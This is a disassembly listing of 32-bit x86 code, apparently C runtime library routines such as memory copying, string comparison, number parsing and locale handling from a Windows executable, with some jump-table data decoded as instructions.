  42825c:	mov    edx,DWORD PTR [ecx+0xc]
  42825f:	mov    edx,DWORD PTR [edx+0xc]
  428262:	cmp    DWORD PTR [ecx+0x8],edx
  428265:	jne    0x42826c
  428267:	mov    eax,0x1
  42826c:	ret    
  42826d:	push   ebx
  42826e:	push   ecx
  42826f:	mov    ebx,0x45d94c
  428274:	jmp    0x428280
  428276:	push   ebx
  428277:	push   ecx
  428278:	mov    ebx,0x45d94c
  42827d:	mov    ecx,DWORD PTR [ebp+0x8]
  428280:	mov    DWORD PTR [ebx+0x8],ecx
  428283:	mov    DWORD PTR [ebx+0x4],eax
  428286:	mov    DWORD PTR [ebx+0xc],ebp
  428289:	pop    ecx
  42828a:	pop    ebx
  42828b:	ret    0x4
  42828e:	int3   
  42828f:	int3   
  428290:	push   ebp
  428291:	mov    ebp,esp
  428293:	push   edi
  428294:	push   esi
  428295:	mov    esi,DWORD PTR [ebp+0xc]
  428298:	mov    ecx,DWORD PTR [ebp+0x10]
  42829b:	mov    edi,DWORD PTR [ebp+0x8]
  42829e:	mov    eax,ecx
  4282a0:	mov    edx,ecx
  4282a2:	add    eax,esi
  4282a4:	cmp    edi,esi
  4282a6:	jbe    0x4282b0
  4282a8:	cmp    edi,eax
  4282aa:	jb     0x42842c
  4282b0:	test   edi,0x3
  4282b6:	jne    0x4282cc
  4282b8:	shr    ecx,0x2
  4282bb:	and    edx,0x3
  4282be:	cmp    ecx,0x8
  4282c1:	jb     0x4282ec
  4282c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282c5:	jmp    DWORD PTR [edx*4+0x4283dc]
  4282cc:	mov    eax,edi
  4282ce:	mov    edx,0x3
  4282d3:	sub    ecx,0x4
  4282d6:	jb     0x4282e4
  4282d8:	and    eax,0x3
  4282db:	add    ecx,eax
  4282dd:	jmp    DWORD PTR [eax*4+0x4282f0]
  4282e4:	jmp    DWORD PTR [ecx*4+0x4283ec]
  4282eb:	nop
  4282ec:	jmp    DWORD PTR [ecx*4+0x428370]
  4282f3:	nop
  4282f4:	add    BYTE PTR [ebx-0x7cd3ffbe],al
  4282fa:	inc    edx
  4282fb:	add    BYTE PTR [eax-0x7d],dl
  4282fe:	inc    edx
  4282ff:	add    BYTE PTR [ebx],ah
  428301:	ror    DWORD PTR [edx-0x75f877fa],1
  428307:	inc    esi
  428308:	add    DWORD PTR [eax+0x468a0147],ecx
  42830e:	add    al,cl
  428310:	jmp    0x28a0b17
  428315:	add    esi,0x3
  428318:	add    edi,0x3
  42831b:	cmp    ecx,0x8
  42831e:	jb     0x4282ec
  428320:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428322:	jmp    DWORD PTR [edx*4+0x4283dc]
  428329:	lea    ecx,[ecx+0x0]
  42832c:	and    edx,ecx
  42832e:	mov    al,BYTE PTR [esi]
  428330:	mov    BYTE PTR [edi],al
  428332:	mov    al,BYTE PTR [esi+0x1]
  428335:	shr    ecx,0x2
  428338:	mov    BYTE PTR [edi+0x1],al
  42833b:	add    esi,0x2
  42833e:	add    edi,0x2
  428341:	cmp    ecx,0x8
  428344:	jb     0x4282ec
  428346:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428348:	jmp    DWORD PTR [edx*4+0x4283dc]
  42834f:	nop
  428350:	and    edx,ecx
  428352:	mov    al,BYTE PTR [esi]
  428354:	mov    BYTE PTR [edi],al
  428356:	add    esi,0x1
  428359:	shr    ecx,0x2
  42835c:	add    edi,0x1
  42835f:	cmp    ecx,0x8
  428362:	jb     0x4282ec
  428364:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428366:	jmp    DWORD PTR [edx*4+0x4283dc]
  42836d:	lea    ecx,[ecx+0x0]
  428370:	rol    DWORD PTR [ebx-0x7c3fffbe],cl
  428376:	inc    edx
  428377:	add    BYTE PTR [eax-0x4fffbd7d],bh
  42837d:	add    DWORD PTR [edx+0x0],0xffffffa8
  428381:	add    DWORD PTR [edx+0x0],0xffffffa0
  428385:	add    DWORD PTR [edx+0x0],0xffffff98
  428389:	add    DWORD PTR [edx+0x0],0xffffff90
  42838d:	add    DWORD PTR [edx+0x0],0xffffff8b
  428391:	inc    esp
  428392:	mov    fs,esp
  428394:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  428398:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42839c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4283a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4283a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4283a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4283ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4283b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4283b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4283b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4283bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4283c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4283c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4283c8:	lea    eax,[ecx*4+0x0]
  4283cf:	add    esi,eax
  4283d1:	add    edi,eax
  4283d3:	jmp    DWORD PTR [edx*4+0x4283dc]
  4283da:	mov    edi,edi
  4283dc:	in     al,dx
  4283dd:	add    DWORD PTR [edx+0x0],0xfffffff4
  4283e1:	add    DWORD PTR [edx+0x0],0x0
  4283e5:	test   BYTE PTR [edx+0x0],al
  4283e8:	adc    al,0x84
  4283ea:	inc    edx
  4283eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4283f1:	leave  
  4283f2:	ret    
  4283f3:	nop
  4283f4:	mov    al,BYTE PTR [esi]
  4283f6:	mov    BYTE PTR [edi],al
  4283f8:	mov    eax,DWORD PTR [ebp+0x8]
  4283fb:	pop    esi
  4283fc:	pop    edi
  4283fd:	leave  
  4283fe:	ret    
  4283ff:	nop
  428400:	mov    al,BYTE PTR [esi]
  428402:	mov    BYTE PTR [edi],al
  428404:	mov    al,BYTE PTR [esi+0x1]
  428407:	mov    BYTE PTR [edi+0x1],al
  42840a:	mov    eax,DWORD PTR [ebp+0x8]
  42840d:	pop    esi
  42840e:	pop    edi
  42840f:	leave  
  428410:	ret    
  428411:	lea    ecx,[ecx+0x0]
  428414:	mov    al,BYTE PTR [esi]
  428416:	mov    BYTE PTR [edi],al
  428418:	mov    al,BYTE PTR [esi+0x1]
  42841b:	mov    BYTE PTR [edi+0x1],al
  42841e:	mov    al,BYTE PTR [esi+0x2]
  428421:	mov    BYTE PTR [edi+0x2],al
  428424:	mov    eax,DWORD PTR [ebp+0x8]
  428427:	pop    esi
  428428:	pop    edi
  428429:	leave  
  42842a:	ret    
  42842b:	nop
  42842c:	lea    esi,[ecx+esi*1-0x4]
  428430:	lea    edi,[ecx+edi*1-0x4]
  428434:	test   edi,0x3
  42843a:	jne    0x428460
  42843c:	shr    ecx,0x2
  42843f:	and    edx,0x3
  428442:	cmp    ecx,0x8
  428445:	jb     0x428454
  428447:	std    
  428448:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42844a:	cld    
  42844b:	jmp    DWORD PTR [edx*4+0x428578]
  428452:	mov    edi,edi
  428454:	neg    ecx
  428456:	jmp    DWORD PTR [ecx*4+0x428528]
  42845d:	lea    ecx,[ecx+0x0]
  428460:	mov    eax,edi
  428462:	mov    edx,0x3
  428467:	cmp    ecx,0x4
  42846a:	jb     0x428478
  42846c:	and    eax,0x3
  42846f:	sub    ecx,eax
  428471:	jmp    DWORD PTR [eax*4+0x42847c]
  428478:	jmp    DWORD PTR [ecx*4+0x428578]
  42847f:	nop
  428480:	mov    WORD PTR [edx+eax*2+0x4284b000],es
  428487:	add    al,bl
  428489:	test   BYTE PTR [edx+0x0],al
  42848c:	mov    al,BYTE PTR [esi+0x3]
  42848f:	and    edx,ecx
  428491:	mov    BYTE PTR [edi+0x3],al
  428494:	sub    esi,0x1
  428497:	shr    ecx,0x2
  42849a:	sub    edi,0x1
  42849d:	cmp    ecx,0x8
  4284a0:	jb     0x428454
  4284a2:	std    
  4284a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284a5:	cld    
  4284a6:	jmp    DWORD PTR [edx*4+0x428578]
  4284ad:	lea    ecx,[ecx+0x0]
  4284b0:	mov    al,BYTE PTR [esi+0x3]
  4284b3:	and    edx,ecx
  4284b5:	mov    BYTE PTR [edi+0x3],al
  4284b8:	mov    al,BYTE PTR [esi+0x2]
  4284bb:	shr    ecx,0x2
  4284be:	mov    BYTE PTR [edi+0x2],al
  4284c1:	sub    esi,0x2
  4284c4:	sub    edi,0x2
  4284c7:	cmp    ecx,0x8
  4284ca:	jb     0x428454
  4284cc:	std    
  4284cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cf:	cld    
  4284d0:	jmp    DWORD PTR [edx*4+0x428578]
  4284d7:	nop
  4284d8:	mov    al,BYTE PTR [esi+0x3]
  4284db:	and    edx,ecx
  4284dd:	mov    BYTE PTR [edi+0x3],al
  4284e0:	mov    al,BYTE PTR [esi+0x2]
  4284e3:	mov    BYTE PTR [edi+0x2],al
  4284e6:	mov    al,BYTE PTR [esi+0x1]
  4284e9:	shr    ecx,0x2
  4284ec:	mov    BYTE PTR [edi+0x1],al
  4284ef:	sub    esi,0x3
  4284f2:	sub    edi,0x3
  4284f5:	cmp    ecx,0x8
  4284f8:	jb     0x428454
  4284fe:	std    
  4284ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428501:	cld    
  428502:	jmp    DWORD PTR [edx*4+0x428578]
  428509:	lea    ecx,[ecx+0x0]
  42850c:	sub    al,0x85
  42850e:	inc    edx
  42850f:	add    BYTE PTR [eax*4-0x7ac3ffbe],dh
  428516:	inc    edx
  428517:	add    BYTE PTR [ebp+eax*4+0x42],al
  42851b:	add    BYTE PTR [ebp+eax*4+0x42],cl
  42851f:	add    BYTE PTR [ebp+eax*4+0x42],dl
  428523:	add    BYTE PTR [ebp+eax*4+0x42],bl
  428527:	add    BYTE PTR [edi-0x7b],ch
  42852a:	inc    edx
  42852b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428531:	inc    esp
  428532:	(bad)  
  428533:	sbb    al,0x8b
  428535:	inc    esp
  428536:	mov    ds,WORD PTR [eax]
  428538:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42853c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428540:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428544:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428548:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42854c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428550:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428554:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428558:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42855c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428560:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428564:	lea    eax,[ecx*4+0x0]
  42856b:	add    esi,eax
  42856d:	add    edi,eax
  42856f:	jmp    DWORD PTR [edx*4+0x428578]
  428576:	mov    edi,edi
  428578:	mov    BYTE PTR [ebp-0x7a6fffbe],al
  42857e:	inc    edx
  42857f:	add    BYTE PTR [eax-0x4bffbd7b],ah
  428585:	test   DWORD PTR [edx+0x0],eax
  428588:	mov    eax,DWORD PTR [ebp+0x8]
  42858b:	pop    esi
  42858c:	pop    edi
  42858d:	leave  
  42858e:	ret    
  42858f:	nop
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	mov    BYTE PTR [edi+0x3],al
  428596:	mov    eax,DWORD PTR [ebp+0x8]
  428599:	pop    esi
  42859a:	pop    edi
  42859b:	leave  
  42859c:	ret    
  42859d:	lea    ecx,[ecx+0x0]
  4285a0:	mov    al,BYTE PTR [esi+0x3]
  4285a3:	mov    BYTE PTR [edi+0x3],al
  4285a6:	mov    al,BYTE PTR [esi+0x2]
  4285a9:	mov    BYTE PTR [edi+0x2],al
  4285ac:	mov    eax,DWORD PTR [ebp+0x8]
  4285af:	pop    esi
  4285b0:	pop    edi
  4285b1:	leave  
  4285b2:	ret    
  4285b3:	nop
  4285b4:	mov    al,BYTE PTR [esi+0x3]
  4285b7:	mov    BYTE PTR [edi+0x3],al
  4285ba:	mov    al,BYTE PTR [esi+0x2]
  4285bd:	mov    BYTE PTR [edi+0x2],al
  4285c0:	mov    al,BYTE PTR [esi+0x1]
  4285c3:	mov    BYTE PTR [edi+0x1],al
  4285c6:	mov    eax,DWORD PTR [ebp+0x8]
  4285c9:	pop    esi
  4285ca:	pop    edi
  4285cb:	leave  
  4285cc:	ret    
  4285cd:	push   ebp
  4285ce:	mov    ebp,esp
  4285d0:	sub    esp,0xc
  4285d3:	mov    eax,ds:0x45d430
  4285d8:	xor    eax,DWORD PTR [ebp+0x4]
  4285db:	and    BYTE PTR [ebp-0x6],0x0
  4285df:	push   0x6
  4285e1:	mov    DWORD PTR [ebp-0x4],eax
  4285e4:	lea    eax,[ebp-0xc]
  4285e7:	push   eax
  4285e8:	push   0x1004
  4285ed:	push   DWORD PTR [ebp+0x8]
  4285f0:	call   DWORD PTR ds:0x429100
  4285f6:	test   eax,eax
  4285f8:	jne    0x4285ff
  4285fa:	or     eax,0xffffffff
  4285fd:	jmp    0x428609
  4285ff:	lea    eax,[ebp-0xc]
  428602:	push   eax
  428603:	call   0x42890e
  428608:	pop    ecx
  428609:	mov    ecx,DWORD PTR [ebp-0x4]
  42860c:	xor    ecx,DWORD PTR [ebp+0x4]
  42860f:	call   0x425a1c
  428614:	leave  
  428615:	ret    
  428616:	push   0x38
  428618:	push   0x429fc0
  42861d:	call   0x425350
  428622:	mov    eax,ds:0x45d430
  428627:	xor    eax,DWORD PTR [ebp+0x4]
  42862a:	mov    DWORD PTR [ebp-0x1c],eax
  42862d:	xor    edi,edi
  42862f:	mov    DWORD PTR [ebp-0x20],edi
  428632:	mov    DWORD PTR [ebp-0x24],edi
  428635:	mov    eax,DWORD PTR [ebp+0x14]
  428638:	mov    ebx,DWORD PTR [eax]
  42863a:	mov    DWORD PTR [ebp-0x28],ebx
  42863d:	mov    DWORD PTR [ebp-0x2c],edi
  428640:	mov    eax,DWORD PTR [ebp+0x8]
  428643:	cmp    eax,DWORD PTR [ebp+0xc]
  428646:	je     0x4287bf
  42864c:	lea    ecx,[ebp-0x40]
  42864f:	push   ecx
  428650:	push   eax
  428651:	mov    esi,DWORD PTR ds:0x4290c8
  428657:	call   esi
  428659:	test   eax,eax
  42865b:	je     0x42867d
  42865d:	cmp    DWORD PTR [ebp-0x40],0x1
  428661:	jne    0x42867d
  428663:	lea    eax,[ebp-0x40]
  428666:	push   eax
  428667:	push   DWORD PTR [ebp+0xc]
  42866a:	call   esi
  42866c:	test   eax,eax
  42866e:	je     0x42867d
  428670:	cmp    DWORD PTR [ebp-0x40],0x1
  428674:	jne    0x42867d
  428676:	mov    DWORD PTR [ebp-0x2c],0x1
  42867d:	cmp    DWORD PTR [ebp-0x2c],edi
  428680:	je     0x42869c
  428682:	cmp    ebx,0xffffffff
  428685:	je     0x42868b
  428687:	mov    esi,ebx
  428689:	jmp    0x428697
  42868b:	push   DWORD PTR [ebp+0x10]
  42868e:	call   0x425960
  428693:	pop    ecx
  428694:	mov    esi,eax
  428696:	inc    esi
  428697:	mov    DWORD PTR [ebp-0x44],esi
  42869a:	jmp    0x42869f
  42869c:	mov    esi,DWORD PTR [ebp-0x44]
  42869f:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a2:	jne    0x4286be
  4286a4:	push   edi
  4286a5:	push   edi
  4286a6:	push   ebx
  4286a7:	push   DWORD PTR [ebp+0x10]
  4286aa:	push   0x1
  4286ac:	push   DWORD PTR [ebp+0x8]
  4286af:	call   DWORD PTR ds:0x4290f0
  4286b5:	mov    esi,eax
  4286b7:	mov    DWORD PTR [ebp-0x44],esi
  4286ba:	cmp    esi,edi
  4286bc:	je     0x428716
  4286be:	mov    DWORD PTR [ebp-0x4],edi
  4286c1:	lea    eax,[esi+esi*1]
  4286c4:	add    eax,0x3
  4286c7:	and    eax,0xfffffffc
  4286ca:	call   0x4253a0
  4286cf:	mov    DWORD PTR [ebp-0x18],esp
  4286d2:	mov    ebx,esp
  4286d4:	mov    DWORD PTR [ebp-0x48],ebx
  4286d7:	lea    eax,[esi+esi*1]
  4286da:	push   eax
  4286db:	push   edi
  4286dc:	push   ebx
  4286dd:	call   0x427c50
  4286e2:	add    esp,0xc
  4286e5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286e9:	jmp    0x428702
  4286eb:	xor    eax,eax
  4286ed:	inc    eax
  4286ee:	ret    
  4286ef:	mov    esp,DWORD PTR [ebp-0x18]
  4286f2:	call   0x4287e5
  4286f7:	xor    edi,edi
  4286f9:	xor    ebx,ebx
  4286fb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4286ff:	mov    esi,DWORD PTR [ebp-0x44]
  428702:	cmp    ebx,edi
  428704:	jne    0x428724
  428706:	push   esi
  428707:	push   0x2
  428709:	call   0x426468
  42870e:	pop    ecx
  42870f:	pop    ecx
  428710:	mov    ebx,eax
  428712:	cmp    ebx,edi
  428714:	jne    0x42871d
  428716:	xor    eax,eax
  428718:	jmp    0x4287d1
  42871d:	mov    DWORD PTR [ebp-0x24],0x1
  428724:	push   esi
  428725:	push   ebx
  428726:	push   DWORD PTR [ebp-0x28]
  428729:	push   DWORD PTR [ebp+0x10]
  42872c:	push   0x1
  42872e:	push   DWORD PTR [ebp+0x8]
  428731:	call   DWORD PTR ds:0x4290f0
  428737:	test   eax,eax
  428739:	je     0x4287c2
  42873f:	cmp    DWORD PTR [ebp+0x18],edi
  428742:	je     0x428764
  428744:	push   edi
  428745:	push   edi
  428746:	push   DWORD PTR [ebp+0x1c]
  428749:	push   DWORD PTR [ebp+0x18]
  42874c:	push   esi
  42874d:	push   ebx
  42874e:	push   edi
  42874f:	push   DWORD PTR [ebp+0xc]
  428752:	call   DWORD PTR ds:0x429080
  428758:	test   eax,eax
  42875a:	je     0x4287c2
  42875c:	mov    eax,DWORD PTR [ebp+0x18]
  42875f:	mov    DWORD PTR [ebp-0x20],eax
  428762:	jmp    0x4287c2
  428764:	cmp    DWORD PTR [ebp-0x2c],edi
  428767:	jne    0x42877f
  428769:	push   edi
  42876a:	push   edi
  42876b:	push   edi
  42876c:	push   edi
  42876d:	push   esi
  42876e:	push   ebx
  42876f:	push   edi
  428770:	push   DWORD PTR [ebp+0xc]
  428773:	call   DWORD PTR ds:0x429080
  428779:	mov    esi,eax
  42877b:	cmp    esi,edi
  42877d:	je     0x4287c2
  42877f:	push   esi
  428780:	push   0x1
  428782:	call   0x426468
  428787:	pop    ecx
  428788:	pop    ecx
  428789:	mov    DWORD PTR [ebp-0x20],eax
  42878c:	cmp    eax,edi
  42878e:	je     0x4287c2
  428790:	push   edi
  428791:	push   edi
  428792:	push   esi
  428793:	push   eax
  428794:	push   esi
  428795:	push   ebx
  428796:	push   edi
  428797:	push   DWORD PTR [ebp+0xc]
  42879a:	call   DWORD PTR ds:0x429080
  4287a0:	cmp    eax,edi
  4287a2:	jne    0x4287b2
  4287a4:	push   DWORD PTR [ebp-0x20]
  4287a7:	call   0x425f5a
  4287ac:	pop    ecx
  4287ad:	mov    DWORD PTR [ebp-0x20],edi
  4287b0:	jmp    0x4287c2
  4287b2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4287b6:	je     0x4287c2
  4287b8:	mov    ecx,DWORD PTR [ebp+0x14]
  4287bb:	mov    DWORD PTR [ecx],eax
  4287bd:	jmp    0x4287c2
  4287bf:	mov    ebx,DWORD PTR [ebp-0x48]
  4287c2:	cmp    DWORD PTR [ebp-0x24],edi
  4287c5:	je     0x4287ce
  4287c7:	push   ebx
  4287c8:	call   0x425f5a
  4287cd:	pop    ecx
  4287ce:	mov    eax,DWORD PTR [ebp-0x20]
  4287d1:	lea    esp,[ebp-0x54]
  4287d4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4287d7:	xor    ecx,DWORD PTR [ebp+0x4]
  4287da:	call   0x425a1c
  4287df:	call   0x42538b
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x48
  4287eb:	push   ebx
  4287ec:	push   esi
  4287ed:	push   edi
  4287ee:	push   0x4
  4287f0:	pop    eax
  4287f1:	call   0x4253a0
  4287f6:	mov    ebx,esp
  4287f8:	push   0x1c
  4287fa:	lea    eax,[ebp-0x24]
  4287fd:	push   eax
  4287fe:	push   ebx
  4287ff:	call   DWORD PTR ds:0x42910c
  428805:	test   eax,eax
  428807:	je     0x42887a
  428809:	mov    edi,DWORD PTR [ebp-0x20]
  42880c:	lea    eax,[ebp-0x48]
  42880f:	push   eax
  428810:	call   DWORD PTR ds:0x42904c
  428816:	mov    eax,DWORD PTR [ebp-0x44]
  428819:	lea    esi,[eax-0x1]
  42881c:	not    esi
  42881e:	and    esi,ebx
  428820:	sub    esi,eax
  428822:	mov    DWORD PTR [ebp-0x4],eax
  428825:	mov    eax,ds:0x45dac4
  42882a:	mov    ecx,eax
  42882c:	dec    ecx
  42882d:	neg    ecx
  42882f:	sbb    ecx,ecx
  428831:	and    ecx,0xffff1000
  428837:	add    ecx,0x11000
  42883d:	add    ecx,edi
  42883f:	cmp    esi,ecx
  428841:	jb     0x42887a
  428843:	cmp    eax,0x1
  428846:	je     0x428892
  428848:	mov    ebx,edi
  42884a:	mov    edi,0x1000
  42884f:	push   0x1c
  428851:	lea    eax,[ebp-0x24]
  428854:	push   eax
  428855:	push   ebx
  428856:	call   DWORD PTR ds:0x42910c
  42885c:	test   eax,eax
  42885e:	je     0x42887a
  428860:	add    ebx,DWORD PTR [ebp-0x18]
  428863:	test   DWORD PTR [ebp-0x14],edi
  428866:	je     0x42884f
  428868:	test   BYTE PTR [ebp-0xf],0x1
  42886c:	mov    ebx,DWORD PTR [ebp-0x24]
  42886f:	je     0x428876
  428871:	xor    eax,eax
  428873:	inc    eax
  428874:	jmp    0x4288ae
  428876:	cmp    esi,ebx
  428878:	jae    0x42887e
  42887a:	xor    eax,eax
  42887c:	jmp    0x4288ae
  42887e:	push   0x4
  428880:	push   edi
  428881:	push   DWORD PTR [ebp-0x4]
  428884:	push   ebx
  428885:	call   DWORD PTR ds:0x4290d0
  42888b:	mov    eax,ds:0x45dac4
  428890:	jmp    0x428894
  428892:	mov    ebx,esi
  428894:	dec    eax
  428895:	neg    eax
  428897:	sbb    eax,eax
  428899:	and    eax,0x103
  42889e:	lea    ecx,[ebp-0x8]
  4288a1:	push   ecx
  4288a2:	inc    eax
  4288a3:	push   eax
  4288a4:	push   DWORD PTR [ebp-0x4]
  4288a7:	push   ebx
  4288a8:	call   DWORD PTR ds:0x429108
  4288ae:	lea    esp,[ebp-0x54]
  4288b1:	pop    edi
  4288b2:	pop    esi
  4288b3:	pop    ebx
  4288b4:	leave  
  4288b5:	ret    
  4288b6:	int3   
  4288b7:	int3   
  4288b8:	int3   
  4288b9:	int3   
  4288ba:	int3   
  4288bb:	int3   
  4288bc:	int3   
  4288bd:	int3   
  4288be:	int3   
  4288bf:	int3   
  4288c0:	push   ebp
  4288c1:	mov    ebp,esp
  4288c3:	push   edi
  4288c4:	push   esi
  4288c5:	push   ebx
  4288c6:	mov    esi,DWORD PTR [ebp+0xc]
  4288c9:	mov    edi,DWORD PTR [ebp+0x8]
  4288cc:	mov    al,0xff
  4288ce:	mov    edi,edi
  4288d0:	or     al,al
  4288d2:	je     0x428906
  4288d4:	mov    al,BYTE PTR [esi]
  4288d6:	add    esi,0x1
  4288d9:	mov    ah,BYTE PTR [edi]
  4288db:	add    edi,0x1
  4288de:	cmp    ah,al
  4288e0:	je     0x4288d0
  4288e2:	sub    al,0x41
  4288e4:	cmp    al,0x1a
  4288e6:	sbb    cl,cl
  4288e8:	and    cl,0x20
  4288eb:	add    al,cl
  4288ed:	add    al,0x41
  4288ef:	xchg   al,ah
  4288f1:	sub    al,0x41
  4288f3:	cmp    al,0x1a
  4288f5:	sbb    cl,cl
  4288f7:	and    cl,0x20
  4288fa:	add    al,cl
  4288fc:	add    al,0x41
  4288fe:	cmp    al,ah
  428900:	je     0x4288d0
  428902:	sbb    al,al
  428904:	sbb    al,0xff
  428906:	movsx  eax,al
  428909:	pop    ebx
  42890a:	pop    esi
  42890b:	pop    edi
  42890c:	leave  
  42890d:	ret    
  42890e:	push   esi
  42890f:	push   edi
  428910:	call   0x425203
  428915:	mov    edi,DWORD PTR [eax+0x64]
  428918:	cmp    edi,DWORD PTR ds:0x45d58c
  42891e:	je     0x428927
  428920:	call   0x4266af
  428925:	mov    edi,eax
  428927:	mov    esi,DWORD PTR [esp+0xc]
  42892b:	cmp    DWORD PTR [edi+0x28],0x1
  42892f:	movzx  eax,BYTE PTR [esi]
  428932:	jle    0x428942
  428934:	push   0x8
  428936:	push   eax
  428937:	push   edi
  428938:	call   0x428996
  42893d:	add    esp,0xc
  428940:	jmp    0x42894c
  428942:	mov    ecx,DWORD PTR [edi+0x48]
  428945:	movzx  eax,BYTE PTR [ecx+eax*2]
  428949:	and    eax,0x8
  42894c:	test   eax,eax
  42894e:	je     0x428953
  428950:	inc    esi
  428951:	jmp    0x42892b
  428953:	movzx  ecx,BYTE PTR [esi]
  428956:	inc    esi
  428957:	cmp    ecx,0x2d
  42895a:	mov    edx,ecx
  42895c:	je     0x428963
  42895e:	cmp    ecx,0x2b
  428961:	jne    0x428967
  428963:	movzx  ecx,BYTE PTR [esi]
  428966:	inc    esi
  428967:	xor    eax,eax
  428969:	cmp    ecx,0x30
  42896c:	jl     0x428978
  42896e:	cmp    ecx,0x39
  428971:	jg     0x428978
  428973:	sub    ecx,0x30
  428976:	jmp    0x42897b
  428978:	or     ecx,0xffffffff
  42897b:	cmp    ecx,0xffffffff
  42897e:	je     0x42898c
  428980:	lea    eax,[eax+eax*4]
  428983:	lea    eax,[ecx+eax*2]
  428986:	movzx  ecx,BYTE PTR [esi]
  428989:	inc    esi
  42898a:	jmp    0x428969
  42898c:	cmp    edx,0x2d
  42898f:	pop    edi
  428990:	pop    esi
  428991:	jne    0x428995
  428993:	neg    eax
  428995:	ret    
  428996:	push   ebp
  428997:	mov    ebp,esp
  428999:	push   ecx
  42899a:	mov    eax,DWORD PTR [ebp+0xc]
  42899d:	lea    ecx,[eax+0x1]
  4289a0:	cmp    ecx,0x100
  4289a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4289a9:	ja     0x4289b4
  4289ab:	mov    ecx,DWORD PTR [ecx+0x48]
  4289ae:	movzx  eax,WORD PTR [ecx+eax*2]
  4289b2:	jmp    0x428a08
  4289b4:	push   esi
  4289b5:	mov    edx,eax
  4289b7:	sar    edx,0x8
  4289ba:	push   edi
  4289bb:	mov    edi,DWORD PTR [ecx+0x48]
  4289be:	movzx  esi,dl
  4289c1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  4289c6:	pop    edi
  4289c7:	pop    esi
  4289c8:	je     0x4289d9
  4289ca:	and    BYTE PTR [ebp-0x2],0x0
  4289ce:	push   0x2
  4289d0:	mov    BYTE PTR [ebp-0x3],al
  4289d3:	mov    BYTE PTR [ebp-0x4],dl
  4289d6:	pop    eax
  4289d7:	jmp    0x4289e3
  4289d9:	and    BYTE PTR [ebp-0x3],0x0
  4289dd:	mov    BYTE PTR [ebp-0x4],al
  4289e0:	xor    eax,eax
  4289e2:	inc    eax
  4289e3:	push   0x1
  4289e5:	push   DWORD PTR [ecx+0x14]
  4289e8:	push   DWORD PTR [ecx+0x4]
  4289eb:	lea    ecx,[ebp+0xe]
  4289ee:	push   ecx
  4289ef:	push   eax
  4289f0:	lea    eax,[ebp-0x4]
  4289f3:	push   eax
  4289f4:	push   0x1
  4289f6:	call   0x427a78
  4289fb:	add    esp,0x1c
  4289fe:	test   eax,eax
  428a00:	jne    0x428a04
  428a02:	leave  
  428a03:	ret    
  428a04:	movzx  eax,WORD PTR [ebp+0xe]
  428a08:	and    eax,DWORD PTR [ebp+0x10]
  428a0b:	leave  
  428a0c:	ret    
  428a0d:	int3   
  428a0e:	int3   
  428a0f:	int3   
  428a10:	mov    eax,DWORD PTR [esp+0x8]
  428a14:	mov    ecx,DWORD PTR [esp+0x10]
  428a18:	or     ecx,eax
  428a1a:	mov    ecx,DWORD PTR [esp+0xc]
  428a1e:	jne    0x428a29
  428a20:	mov    eax,DWORD PTR [esp+0x4]
  428a24:	mul    ecx
  428a26:	ret    0x10
  428a29:	push   ebx
  428a2a:	mul    ecx
  428a2c:	mov    ebx,eax
  428a2e:	mov    eax,DWORD PTR [esp+0x8]
  428a32:	mul    DWORD PTR [esp+0x14]
  428a36:	add    ebx,eax
  428a38:	mov    eax,DWORD PTR [esp+0x8]
  428a3c:	mul    ecx
  428a3e:	add    edx,ebx
  428a40:	pop    ebx
  428a41:	ret    0x10
  428a44:	int3   
  428a45:	int3   
  428a46:	int3   
  428a47:	int3   
  428a48:	int3   
  428a49:	int3   
  428a4a:	int3   
  428a4b:	int3   
  428a4c:	int3   
  428a4d:	int3   
  428a4e:	int3   
  428a4f:	int3   
  428a50:	push   ebp
  428a51:	mov    ebp,esp
  428a53:	push   edi
  428a54:	push   esi
  428a55:	push   ebx
  428a56:	mov    ecx,DWORD PTR [ebp+0x10]
  428a59:	or     ecx,ecx
  428a5b:	je     0x428aaa
  428a5d:	mov    esi,DWORD PTR [ebp+0x8]
  428a60:	mov    edi,DWORD PTR [ebp+0xc]
  428a63:	mov    bh,0x41
  428a65:	mov    bl,0x5a
